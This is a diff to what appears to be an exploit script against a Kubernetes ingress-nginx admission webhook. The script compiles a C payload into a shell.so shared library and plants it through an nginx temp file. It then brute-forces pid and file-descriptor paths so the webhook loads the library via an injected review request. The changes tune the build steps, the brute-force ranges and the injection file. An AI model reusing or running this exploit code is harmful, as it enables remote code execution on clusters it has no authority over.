@@ -18,7 +18,14 @@ def create_so_payload(cmd="id"):
         f.close()
     
     try:
-        res = subprocess.run(["gcc", "shell.c", "-fPIC", "-shared", "-o", "./shell.so"])
+        res = subprocess.run(["gcc", "-fPIC", "-c", "shell.c", "-o", "./shell.o"])
+        return res.returncode > -1
+    except Exception as e:
+        logger.error(f"GCC compilation error: {e}")
+        exit(-1)
+
+    try:
+        res = subprocess.run(["gcc", "-shared", "-o", "shell.so", "-lcrypto", "shell.o"])
         return res.returncode > -1
     except Exception as e:
         logger.error(f"GCC compilation error: {e}")
@@ -96,20 +103,14 @@ def attempt_dlopen(url, data, pid, fd):
     except Exception as e:
         logger.error(f"Error: {e} for {path}")
     
-def brute_admission_webhook(url, data, workers=3):
+def brute_admission_webhook(url, data, workers=5):
 
-    # futures = {}
     with ThreadPoolExecutor(max_workers=workers) as executor:
-        for pid in range(20, 40):
+        for pid in range(30, 40):
             for fd in range(10,30):
                 executor.submit(attempt_dlopen, url, data, pid, fd)
 
-                # futures.update({executor.submit(attempt_dlopen, url, data, pid, fd): fd for fd  in range(5,20)})
-
-        # for future in concurrent.futures.as_completed(futures):
-        #     data = future.result()
-
-        # pid=36
+        # pid=31
         # fd=11
         # executor.submit(attempt_dlopen, url, data, pid, fd)
 
@@ -133,7 +134,7 @@ def main():
         temp_file = threading.Thread(target=create_nginx_temp_file, args=(nginx_host,))
         temp_file.start()
         
-        data = open('./injection/auth-url-review.json', 'r').read()
+        data = open('./injection/mirror-annotations-review.json', 'r').read()
         brute_admission_webhook(admission_host, data)
 
 logger = logging.getLogger(__name__)
